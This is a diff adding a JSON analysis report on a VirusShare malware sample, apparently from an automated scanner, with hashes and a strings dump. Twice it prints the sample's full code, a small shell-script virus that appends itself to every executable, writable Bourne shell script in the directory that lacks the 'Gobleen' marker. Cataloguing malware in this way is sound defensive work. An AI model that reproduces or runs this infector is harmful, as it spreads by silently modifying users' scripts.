@@ -1,0 +1,38 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {},
+        "macro": "for vic in *\ndo\n if [ ! -d $vic ] && [ -z \"`grep -s Gobleen $vic`\" -a -x $vic -a -w $vic ] ; then\n  if [ -n \"`file $vic | grep Bourne`\" ] ; then\n   echo >> $vic\n   tail -n 8 $0 >> $vic\n fi; fi \ndone"
+    },
+    "filename": "VirusShare_1971629f8fb3dbdb8afe04c688127b9c",
+    "filesize": 198,
+    "filetype": "ASCII text",
+    "hashes": {
+        "md5": "1971629f8fb3dbdb8afe04c688127b9c",
+        "sha1": "9fbc14599cdded0959c8024aba5827411fe6221d",
+        "sha256": "bec4e5e3ab5774da0a1b48d5e3de54d7f3cba0c9d747e672a74ea6c07d746bf5"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "for vic in *",
+            " if [ ! -d $vic ] && [ -z \"`grep -s Gobleen $vic`\" -a -x $vic -a -w $vic ] ; then",
+            "  if [ -n \"`file $vic | grep Bourne`\" ] ; then",
+            "   echo >> $vic",
+            "   tail -n 8 $0 >> $vic",
+            " fi; fi ",
+            "done"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.258724",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
